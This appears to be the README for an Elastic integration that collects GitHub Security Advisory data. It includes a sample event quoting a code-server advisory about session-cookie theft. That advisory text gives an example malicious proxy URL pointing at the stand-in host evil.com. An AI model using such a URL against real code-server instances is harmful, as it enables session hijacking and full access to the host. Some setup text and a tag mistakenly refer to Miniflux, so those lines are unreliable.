# GitHub Security Advisory integration

## Overview

The [GitHub Security Advisory](https://github.com/advisories) integration allows you to extract data from the GitHub Security Advisory database. 

Use the GitHub Security Advisory integration to extract reviewed, unreviewed or malware security advisories. Then visualize that data in Kibana, create alerts to notify you on some specifics conditions.

For example, if you wanted to be notified for a new security advisory with a CVSS score higher than 9.0, you could set up an alert. 

## Datastreams

This integration collects the following logs:

- **[Security Advisories](https://docs.github.com/en/rest/security-advisories/global-advisories?apiVersion=2022-11-28)** - Retrieves security advisories from the GitHub REST API. 

## Requirements

You need Elasticsearch for storing and searching your data and Kibana for visualizing and managing it. You can use our hosted Elasticsearch Service on Elastic Cloud, which is recommended, or self-manage the Elastic Stack on your own hardware.

Each data stream collects different kinds of logs data, which may require dedicated permissions to be fetched and may vary across operating systems. Details on the permissions needed for each data stream are available in the Logs reference.

## Setup

Before sending logs to Elastic from your Miniflux application (self-hosted or SaaS), you must create a GitHub Personall Access Token (PAT) by following [GitHub's documentation](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)

After you've configured your device, you can set up the Elastic integration.

## Logs

### Vulnerability

This is the `vulnerability` dataset.

An example event for `vulnerability` looks as following:

```json
{
    "@timestamp": "2025-05-11T13:57:59.364Z",
    "agent": {
        "ephemeral_id": "19991d29-a79b-467c-93af-f425b85de028",
        "id": "5374b8ec-e50d-43be-9cfd-c7716d8b938c",
        "name": "elastic-agent-18061",
        "type": "filebeat",
        "version": "8.18.0"
    },
    "data_stream": {
        "dataset": "github_security_advisory.vulnerability",
        "namespace": "99076",
        "type": "logs"
    },
    "ecs": {
        "version": "8.17.0"
    },
    "elastic_agent": {
        "id": "5374b8ec-e50d-43be-9cfd-c7716d8b938c",
        "snapshot": false,
        "version": "8.18.0"
    },
    "event": {
        "agent_id_status": "verified",
        "category": [
            "vulnerability"
        ],
        "dataset": "github_security_advisory.vulnerability",
        "ingested": "2025-05-11T13:58:02Z",
        "kind": "enrichment",
        "type": [
            "info"
        ]
    },
    "github_security_advisory": {
        "cve_id": "CVE-2025-47269",
        "cvss": {
            "score": 8.3,
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L"
        },
        "cvss_severities": {
            "cvss_v3": {
                "score": 8.3,
                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L"
            },
            "cvss_v4": {
                "score": 0
            }
        },
        "cwes": [
            {
                "cwe_id": "CWE-441",
                "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
            }
        ],
        "description": "### Summary\n\nA maliciously crafted URL using the `proxy` subpath can result in the attacker gaining access to the session token.\n\n### Details\n\nFailure to properly validate the port for a `proxy` request can result in proxying to an arbitrary domain. The malicious URL `https://<code-server>/proxy/test@evil.com/path` would be proxied to `test@evil.com/path` where the attacker could exfiltrate a user's session token.\n\n### Impact\n\nAny user who runs code-server with the built-in proxy enabled and clicks on maliciously crafted links that go to their code-server instances with reference to `/proxy`.\n\nNormally this is used to proxy local ports, however the URL can reference the attacker's domain instead, and the connection is then proxied to that domain, which will include sending cookies.\n\nWith access to the session cookie, the attacker can then log into code-server and have full access to the machine hosting code-server as the user running code-server.\n\n### Patches\n\nPatched versions are from [v4.99.4](https://github.com/coder/code-server/releases/tag/v4.99.4) onward.",
        "ghsa_id": "GHSA-p483-wpfp-42cj",
        "github_reviewed_at": "2025-05-09T19:34:35.000Z",
        "html_url": "https://github.com/advisories/GHSA-p483-wpfp-42cj",
        "identifiers": [
            {
                "type": "GHSA",
                "value": "GHSA-p483-wpfp-42cj"
            },
            {
                "type": "CVE",
                "value": "CVE-2025-47269"
            }
        ],
        "nvd_published_at": "2025-05-09T21:15:51.000Z",
        "published_at": "2025-05-09T19:34:35.000Z",
        "references": [
            "https://github.com/coder/code-server/security/advisories/GHSA-p483-wpfp-42cj",
            "https://github.com/coder/code-server/commit/47d6d3ada5aadef6d221f3d612401eb3dad9299e",
            "https://github.com/coder/code-server/releases/tag/v4.99.4",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-47269",
            "https://github.com/advisories/GHSA-p483-wpfp-42cj"
        ],
        "repository_advisory_url": "https://api.github.com/repos/coder/code-server/security-advisories/GHSA-p483-wpfp-42cj",
        "severity": "high",
        "source_code_location": "https://github.com/coder/code-server",
        "summary": "code-server's session cookie can be extracted by having user visit specially crafted proxy URL",
        "type": "reviewed",
        "updated_at": "2025-05-09T21:39:17.000Z",
        "url": "https://api.github.com/advisories/GHSA-p483-wpfp-42cj",
        "vulnerabilities": [
            {
                "first_patched_version": "4.99.4",
                "package": {
                    "ecosystem": "npm",
                    "name": "code-server"
                },
                "vulnerable_version_range": "< 4.99.4"
            }
        ]
    },
    "input": {
        "type": "cel"
    },
    "tags": [
        "forwarded",
        "miniflux-feed_entry"
    ],
    "url": {
        "domain": "github.com",
        "full": "https://github.com/advisories/GHSA-p483-wpfp-42cj",
        "original": "https://github.com/advisories/GHSA-p483-wpfp-42cj",
        "path": "/advisories/GHSA-p483-wpfp-42cj",
        "scheme": "https"
    },
    "vulnerability": {
        "id": "CVE-2025-47269",
        "severity": "high"
    }
}
```

**Exported fields**

| Field | Description | Type |
|---|---|---|
| @timestamp | Event timestamp. | date |
| data_stream.dataset | Data stream dataset. | constant_keyword |
| data_stream.namespace | Data stream namespace. | constant_keyword |
| data_stream.type | Data stream type. | constant_keyword |
| github_security_advisory.credits.avatar_url |  | keyword |
| github_security_advisory.credits.events_url |  | keyword |
| github_security_advisory.credits.followers_url |  | keyword |
| github_security_advisory.credits.following_url |  | keyword |
| github_security_advisory.credits.gists_url |  | keyword |
| github_security_advisory.credits.html_url |  | keyword |
| github_security_advisory.credits.id |  | long |
| github_security_advisory.credits.login |  | keyword |
| github_security_advisory.credits.node_id |  | keyword |
| github_security_advisory.credits.organizations_url |  | keyword |
| github_security_advisory.credits.received_events_url |  | keyword |
| github_security_advisory.credits.repos_url |  | keyword |
| github_security_advisory.credits.site_admin |  | boolean |
| github_security_advisory.credits.starred_url |  | keyword |
| github_security_advisory.credits.subscriptions_url |  | keyword |
| github_security_advisory.credits.type |  | keyword |
| github_security_advisory.credits.url |  | keyword |
| github_security_advisory.credits.user_view_type |  | keyword |
| github_security_advisory.cve_id |  | keyword |
| github_security_advisory.cvss.score |  | float |
| github_security_advisory.cvss.vector_string |  | keyword |
| github_security_advisory.cvss_severities.cvss_v3.score |  | float |
| github_security_advisory.cvss_severities.cvss_v3.vector_string |  | keyword |
| github_security_advisory.cvss_severities.cvss_v4.score |  | float |
| github_security_advisory.cvss_severities.cvss_v4.vector_string |  | keyword |
| github_security_advisory.cwes.cwe_id |  | keyword |
| github_security_advisory.cwes.name |  | keyword |
| github_security_advisory.description |  | keyword |
| github_security_advisory.ghsa_id |  | keyword |
| github_security_advisory.github_reviewed_at |  | date |
| github_security_advisory.html_url |  | keyword |
| github_security_advisory.identifiers.type |  | keyword |
| github_security_advisory.identifiers.value |  | keyword |
| github_security_advisory.nvd_published_at |  | date |
| github_security_advisory.published_at |  | date |
| github_security_advisory.references |  | keyword |
| github_security_advisory.repository_advisory_url |  | keyword |
| github_security_advisory.severity |  | keyword |
| github_security_advisory.source_code_location |  | keyword |
| github_security_advisory.summary |  | keyword |
| github_security_advisory.type |  | keyword |
| github_security_advisory.updated_at |  | date |
| github_security_advisory.url |  | keyword |
| github_security_advisory.vulnerabilities.first_patched_version |  | keyword |
| github_security_advisory.vulnerabilities.package.ecosystem |  | keyword |
| github_security_advisory.vulnerabilities.package.name |  | keyword |
| github_security_advisory.vulnerabilities.vulnerable_version_range |  | keyword |
| input.type | Type of filebeat input. | keyword |

